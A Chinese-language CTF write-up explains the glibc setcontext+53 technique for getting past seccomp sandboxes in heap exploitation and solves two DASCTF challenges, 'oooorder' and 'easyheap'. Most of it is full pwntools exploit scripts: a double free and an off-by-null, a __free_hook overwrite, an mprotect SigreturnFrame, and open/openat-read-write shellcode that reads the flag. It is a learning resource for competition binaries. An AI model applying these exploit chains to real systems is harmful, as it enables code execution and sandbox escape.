---
title: 从DASCTF6月赛中学习setcontext绕过seccomp
tags:
  - binary
  - Writesup
---

## setcontext

### **概述**

```c
#include <ucontext.h>

int setcontext(const ucontext_t *ucp);
```

作用是设置用户的上下文。在堆题目里，如果我们可以控制执行流、已知libc_base但是无法执行execve时可以尝试利用setcontext来获取flag。

```assembly
<setcontext>:     push   rdi
<setcontext+1>:   lea    rsi,[rdi+0x128]
<setcontext+8>:   xor    edx,edx
<setcontext+10>:  mov    edi,0x2
<setcontext+15>:  mov    r10d,0x8
<setcontext+21>:  mov    eax,0xe
<setcontext+26>:  syscall 
<setcontext+28>:  pop    rdi
<setcontext+29>:  cmp    rax,0xfffffffffffff001
<setcontext+35>:  jae    0x7ffff7a7d520 <setcontext+128>
<setcontext+37>:  mov    rcx,QWORD PTR [rdi+0xe0]
<setcontext+44>:  fldenv [rcx]
<setcontext+46>:  ldmxcsr DWORD PTR [rdi+0x1c0]
<setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
<setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
<setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
<setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
<setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
<setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
<setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
<setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
<setcontext+94>:  push   rcx
<setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
<setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
<setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
<setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
<setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
<setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
<setcontext+125>: xor    eax,eax
<setcontext+127>: ret    
<setcontext+128>: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78
<setcontext+135>: neg    eax
<setcontext+137>: mov    DWORD PTR fs:[rcx],eax
<setcontext+140>: or     rax,0xffffffffffffffff
<setcontext+144>: ret
```

`setcontext+44`处的指令`fldenv [rcx]`会直接导致程序产生crash，所以我们需要避开它。

### **构造ucontext_t**

我们利用pwntools里面的工具直接构造。

在构造之前，我们需要指定机器的运行模式。`context.arch = 'amd64' 或 'i386'`

```python
frame = SigreturnFrame()
frame.rip = 0 // setcontext之后执行的值
frame.rdi = 0
frame.rsi = 0
frame.rdx = 0 // 3个参数
frame.rsp = 0 // rip执行完之后执行的值
frame.rax = 0
```

### **一般利用方式**

1. 将`setcontext+53`写入`__free_hook`，`__free_hook+0x8`写入一个`__free_hook+0x10`，后面写`read;jmp rsi`的`shellcode`。
2. 构造`frame`，rip设置成`mprotect`，准备将`__free_hook&0xfffffffffffff000`之后的连续0x1000区域权限设置成7。找一个堆块存放`frame`。
3. 释放存放`frame`的`chunk`，此时执行到`read`。
4. 将事先准备好的`getflag`的`shellcode`发送到服务器，即执行`shellcode`，得到flag。

### 脚本模板

```python
newexe = libc.sym['__free_hook'] & 0xfffffffffffff000
context.arch = 'amd64'
shell1 = '''
xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi
''' % newexe
frame = SigreturnFrame()
frame.rsp = libc.sym['__free_hook']+0x10
frame.rdi = newexe
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1
frame.rip = libc.sym['mprotect']

shell2 = '''
mov rax,0x67616c662f
push rax

mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall

mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall

mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall

mov rdi,0
mov rax,60
syscall
'''
```



## oooorder

64位ELF，保护全开

```
$ file oooorder
oooorder: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9e7ea3df14ad943524ac1e2f9bde7e61b3155ea2, stripped
$ checksec oooorder
[*] '/home/abc/work/DASCTF3rd/oooorder'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

添加堆块的时候没有进行size的下界检测：

```c
      if ( size <= 0x400 )
      {
        chunklist[i] = malloc(0x10uLL);
        if ( !chunklist[i] )
        {
          puts("Allocate Error\n");
          exit(1);
        }
        v0 = chunklist[i];
        *v0 = malloc(size);
        puts("Order notes:");
        myread(*v0, size);
        *(v0 + 8) = size;
        printf("Success,your order index is [%d].\n", i);
        return __readfsqword(0x28u) ^ v5;
      }
      puts("error");
    }
```

而edit函数中出现realloc，可以利用realloc(*chunk,0)造成double free。

```c
    if ( chunklist[v1] )
  {
    v2 = chunklist[v1];
    v3 = realloc(*v2, *(v2 + 8));
    if ( v3 )
    {
      *v2 = v3;
      puts("Order notes:");
      myread(*v2, *(v2 + 8));
      puts("Done!\n");
    }
    else
    {
      puts("Can not edit this order!");
    }
  }
```

开了沙箱，用setcontext+53进行orw。

```c
v5 = __readfsqword(0x28u);
seccomp_();
```

于是整理思路：

1. 用`double free`，可以泄露堆地址
2. 用`unsorted bin`残留指针，可以泄露libc地址。
3. 用`double free`的`0x20`大小的堆块，分配到大堆块上，改`free`后的`fd`，从而将`__free_hook`塞进`tcache bin`中。
4. 申请一个堆块，放`frame`。
5. `free`掉`frame`，输入shellcode2，游戏结束。

### exp

```python
from pwn import *
io = process("./oooorder")
#io = remote("")
elf = ELF("./oooorder")
libc = ELF("../x64-libc-2.27.so")
#context.log_level = 'debug'

def add(size,con):
    io.sendlineafter("Your choice :",'1')
    io.sendlineafter("order?",str(size))
    io.sendafter("notes:",con)
    
def edit(idx,con):
    io.sendlineafter("Your choice :",'2')
    io.sendlineafter("order:",str(idx))
    io.sendafter("notes:",con)

def edit_fake(idx):
    io.sendlineafter("Your choice :",'2')
    io.sendlineafter("order:",str(idx))
    
def free(idx):
    io.sendlineafter("Your choice :",'4')
    io.sendlineafter("order:",str(idx))
    
def show():
    io.sendlineafter("Your choice :",'3')
    
def dbg():
    gdb.attach(io)
    pause()

for i in range(7):
    add(0x130,'a')

add(0x130,'a')#7
add(0x120,'a')#8


for i in range(7):
    free(i)


free(7)
add(0x100,'\xa0')#0
show()
libc.address = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3ebda0
log.info(hex(libc.address))

add(0,'')# 1
edit_fake(1)
edit_fake(1)
show()
io.recvuntil("[1]:")
heap_base = u64(io.recv(6).ljust(8,'\x00')) - 0xed0
log.info(hex(heap_base))
newexe = libc.sym['__free_hook'] & 0xfffffffffffff000
context.arch = 'amd64'
shell1 = '''
xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi
''' % newexe

frame = SigreturnFrame()
frame.rsp = libc.sym['__free_hook']+0x10
frame.rdi = newexe
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1
frame.rip = libc.sym['mprotect']

shell2 = '''
mov rax,0x67616c662f
push rax

mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall

mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall

mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall

mov rdi,0
mov rax,60
syscall
'''
edit(0,str(frame))

free(8)
add(0x10,p64(heap_base+0xd80))
add(0x10,p64(libc.sym["__free_hook"])*2)

add(0x120,'a')
payload = p64(libc.sym['setcontext']+53) + p64(libc.sym['__free_hook']+0x18)*2 + asm(shell1)
add(0x120,payload)
gdb.attach(io,'b *$rebase(0x1207)')
free(0)
pause()
io.sendline(asm(shell2))
io.interactive()
```

## easyheap

> easy个🔨

64位ELF文件，保护全开。libc版本为`libc-2.27.so`。

```
$ file easyheap
easyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b4b83be998cde4b500ae572ecfdb4396f4f6426c, not stripped
$ checksec easyheap
[*] '/home/abc/work/DASCTF3rd/easyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

开了沙箱，并且tmd把`open`给ban了。

```
$ seccomp-tools dump ./easyheap
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x02 0x01 0x40000000  if (A >= 0x40000000) goto 0006 else goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 4294967295) goto 0008
 0005: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0008
 0006: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

对策就是把`open`替换成`openat`。

```c
int openat(int dirfd, const char *pathname, int flags, mode_t mode);
```

还有个坑。此题实用`calloc`进行堆块分配，在`add`函数内存在`off-by-null`漏洞。按理说`fastbin attack`无法打`__free_hook`，但是我们可以用`unsorted bin attack`在`__free_hook-0x20`位置写入一个libc地址，然后再打。注意`unsorted bin attack`的`fd`构造好之后要申请同样`size`的堆块，不然报错。

```python
edit(12,p64(0)+p64(libc.sym['__free_hook']-16-16))
add(8,0xa8,'a')
```

整理思路：

1. `off-by-null`制造两个`overlapping`的`chunk`，一个在`fastbin`范围中，一个在`unsorted bin`中。
2. 用`unsorted bin attack`打`__free_hook-0x20`，用`fastbin attack`分配到`__free_hook`。
3. 填入`setcontext`，进行orw。

### exp

```python
from pwn import *
io = process("./easyheap")
#io = remote("183.129.189.60",10027)
elf = ELF("./easyheap")
libc = ELF("../x64-libc-2.27.so")
context.log_level = 'debug'

def add(idx,size,con):
    io.sendlineafter("Your Choice: ",'1')
    io.sendlineafter("index>>",str(idx))
    io.sendlineafter("size>>",str(size))
    io.sendafter("name>>",con)
    
def edit(idx,con):
    io.sendlineafter("Your Choice:",'4')
    io.sendlineafter("index>>",str(idx))
    io.sendafter("name>> ",con)
    
def free(idx):
    io.sendlineafter("Your Choice: ",'2')
    io.sendlineafter("index>>",str(idx))
    
def show(idx):
    io.sendlineafter("Your Choice: ",'3')
    io.sendlineafter("index>>",str(idx))
    
def dbg():
    gdb.attach(io)
    pause()
    
for i in range(7):
    add(0,0x1f8,'a')
    free(0)
for i in range(7):
    add(0,0x68,'a')
    free(0)
for i in range(7):
    add(0,0xa8,'a')
    free(0)
add(0,0x18,'a')

add(1,0x1f0,'a')
add(2,0x68,'a')
add(3,0x1f8,'a')

add(4,0x68,'a')

free(1)
free(2)

add(2,0x68,'a'*0x60 + p64(0x270))# 2
free(3)

add(1,0x1f0,'a')
show(2)
libc.address = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3ebca0

add(3,0x68,'a')
free(4)
free(2)
show(3)
io.recv()
heap_base = u64(io.recv(6).ljust(8,'\x00')) - 0x17f0 - 0x420
log.info(hex(heap_base))
add(2,0x68,'a')
add(4,0x68,'a')

add(5,0x1f0,'a')
add(6,0x1f0,'a')
add(7,0x28,'a')
add(8,0xa8,'a')
add(9,0x1f8,'a')
add(10,0x28,'a')

free(6)
free(8)
add(8,0xa8,'a'*0xa0+p64(0x280))
add(11,0x50,'a')
free(9)
add(6,0x1c0,'a')
add(12,0xa8,'a')
add(9,0x1f0,'a')
free(8)
edit(12,p64(0)+p64(libc.sym['__free_hook']-16-16))
add(8,0xa8,'a')
newexe = libc.sym['__free_hook'] & 0xfffffffffffff000
context.arch = 'amd64'
shell1 = '''
xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi
''' % newexe

frame = SigreturnFrame()
frame.rsp = libc.sym['__free_hook']+0x10
frame.rdi = newexe
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1
frame.rip = libc.sym['mprotect']

flag = '/flag\x00\x00\x00'
shell2 = '''
mov rax,%s
push rax

mov rdi,0
mov rsi,rsp
mov rdx,0
mov rax,257
syscall

mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall

mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall

mov rdi,0
mov rax,60
syscall
''' % hex(u64(flag))
edit(1,str(frame))
free(2)
free(4)
free(3)
add(2,0x68,p64(libc.sym["__free_hook"]-0x13))
add(3,0x68,p64(libc.sym["__free_hook"]-0x13))
add(4,0x68,p64(libc.sym["__free_hook"]-0x13))
add(13,0x68,'a'*3+p64(libc.sym['setcontext']+53) + p64(libc.sym['__free_hook']+0x18)*2 + asm(shell1))
gdb.attach(io,'b *$rebase(0xe19)')
free(1)
pause()
io.sendline(asm(shell2))

io.interactive()
```
